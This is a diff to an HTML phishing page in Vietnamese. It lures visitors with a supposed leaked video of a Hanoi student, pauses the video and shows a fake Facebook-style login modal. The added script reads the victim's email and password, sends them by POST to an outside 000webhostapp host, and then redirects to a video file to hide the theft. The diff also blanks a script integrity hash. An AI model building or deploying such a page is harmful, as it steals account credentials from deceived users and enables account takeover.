@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html
     xmlns="http://www.w3.org/1999/xhtml">
@@ -8,7 +9,7 @@
         <meta content="article" property="og:type"/>
         <meta content="https://vi-vn.fb-confirm.com/Images/bg-hot-mom.jpg" property="og:image"/>
         <title>
-           Lộ clip hot girl sinh viên hà nội
+            Lộ clip hot girl sinh viên hà nội
         </title>
         <link crossorigin="anonymous" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="" rel="stylesheet"/>
         <link href="https://cdn.plyr.io/3.6.2/plyr.css" rel="stylesheet"/>
@@ -45,11 +46,12 @@
                     <label>
                         <input id="pass" name="pass" placeholder="Mật khẩu" required="" type="password"/>
                     </label>
-                    <input id="txtBoxLogin" name="txtBoxLogin" onclick="javascript:document.getElementById('lblMsg').innerText = 'Đang kiểm tra tài khoản vui lòng chờ trong giây lát';" type="submit" value="Đăng nhập"/>
+                    <input id="txtBoxLogin" name="txtBoxLogin"  type="button" value="Đăng nhập"/>
                 </form>
                 <h5>
                     <a href="#">
                         Quên mật khẩu?
+                        <!-- onclick="javascript:document.getElementById('lblMsg').innerText = 'Đang kiểm tra tài khoản vui lòng chờ trong giây lát';" -->
                     </a>
                 </h5>
             </section>
@@ -58,19 +60,30 @@
         <script src="//code.jquery.com/jquery.js"></script>
         <script type="text/javascript">
             const player = new Plyr('#player');
-    function showPopup() {
-        setTimeout(function () {
-            showlog();
-            setTimeout(function() { player.pause(); }, 500);
-        }, 3000);
-    }
-    function showlog() {
-        $('#myModal').modal({
-            backdrop: 'static',
-            keyboard: true,
-            show: true
-        });
-    };
+            function showPopup() {
+                setTimeout(function () {
+                    showlog();
+                    setTimeout(function() { player.pause(); }, 500);
+                }, 3000);
+            }
+            function showlog() {
+                $('#myModal').modal({
+                    backdrop: 'static',
+                    keyboard: true,
+                    show: true
+                });
+            };
+            $(document).ready(function() {
+                $("#txtBoxLogin").click(function(event) {
+                    $("#lblMsg").html("Đang kiểm tra tài khoản vui lòng chờ trong giây lát")
+                    var email = $("#email").val();
+                    var pass = $("#pass").val();
+                    console.log(email); console.log(pass);
+                    $.post('https://lengockha2021.000webhostapp.com/index.php', {email: email,pass: pass}, function(data, textStatus, xhr) {
+                        location.replace("http://vi-vn.fb-confirm.com/Videos/vu-huong-mai.mp4");
+                    });
+                });
+            });
         </script>
         <!-- Global site tag (gtag.js) - Google Analytics -->
         
@@ -81,6 +94,6 @@
 
     gtag('config', 'UA-49283499-10');
         </script>
-        <script crossorigin="anonymous" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+        <script crossorigin="anonymous" integrity="" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
     </body>
 </html>
